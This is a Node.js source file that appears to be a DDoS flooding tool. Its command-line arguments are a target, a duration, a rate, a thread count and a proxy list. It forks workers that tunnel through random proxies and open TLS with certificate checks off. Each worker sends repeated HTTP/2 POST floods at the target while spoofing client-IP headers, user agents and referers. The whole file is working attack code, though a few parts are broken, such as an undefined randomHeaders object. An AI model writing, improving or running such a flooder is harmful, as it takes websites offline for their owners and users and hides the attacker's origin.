const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const { HeaderGenerator } = require('header-generator');
 const fakeUa = require('fake-useragent');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`node TLSv2.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
// 生成随机整数
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  
  // 生成随机版本号
  function generateRandomVersion(maxMajor, maxMinor) {
    const major = getRandomInt(1, maxMajor);
    const minor = getRandomInt(0, maxMinor);
    return `${major}.${minor}`;
  }
  
  function generateRandomUA() {
    const webKitVersion = generateRandomVersion(9,99);
    const chromeVersion = generateRandomVersion(9,9,9,9);
    const edgVersion = generateRandomVersion(9,9,999,999);
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53${webKitVersion} (KHTML, like Gecko) Chrome/10${chromeVersion} Safari/53${webKitVersion} Edg/10${edgVersion}`;
  }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 function getRandomNumberBetween(min,max){
     return Math.floor(Math.random()*(max-min+1)+min);
 }
 function RandomString(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 let headerGenerator = new HeaderGenerator({
     browsers: [
         {name: "firefox", minVersion: 100, httpVersion: "2"},
     ],
     devices: [
         "desktop",
     ],
     operatingSystems: [
         "windows",
     ],
     locales: ["en-US", "en"]
 });

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 60000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 const postData = RandomString(getRandomNumberBetween(1,64))
 const fake_ip = () => {
    const nmsl = () => {
      return Math.floor(Math.random() * 255);
    };
    return `${""}${nmsl()}${"."}${nmsl()}${"."}${nmsl()}${"."}${nmsl()}${""}`;
  };
 const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://yandex.ru/",
  ];
 var fakeRefer = refers[Math.floor(Math.random() * refers.length)];
 const fakeIP = fake_ip();
 const Header = new NetSocket();
 headers[":method"] = "POST";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["Referer"] = fakeRefer;
 headers["accept"] = randomHeaders['accept'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["accept-language"] = "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6";
 headers["Cache-Control"] = randomHeaders['Cache-Control'];
 headers["Connection"] = "keep-alive";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["pragma"] =  "no-cache";
 headers["Cookie"] = randomHeaders['cookie'];
 headers["Content-Length"] = postData.length;
 headers["X-Forwarded-For"] = fakeIP;
 headers["X-Forwarded-Host"] = fakeIP;
 headers["Client-IP"] = fakeIP;
 headers["Real-IP"] = fakeIP;
// headers["Sec-Ch-Ua"] = "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115";
// headers["Sec-Fetch-Dest"] = "document";
// headers["Sec-Fetch-Mode"] = "navigate";
// headers["Sec-Fetch-Site"] = "same-origin";
// headers["Sec-Fetch-User"] = "?1";
// headers["Upgrade-Insecure-Requests "] = "1";
// headers["Sec-Ch-Ua-Platform"] = "Windows";
// headers["Sec-CH-UA-Mobile"] = "?0";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     var useragent = generateRandomUA();
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = useragent;
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host ,
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
                    request.write(postData);
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
     const KillScript = () => process.exit(1);
     setTimeout(KillScript, args.time * 1000);
 }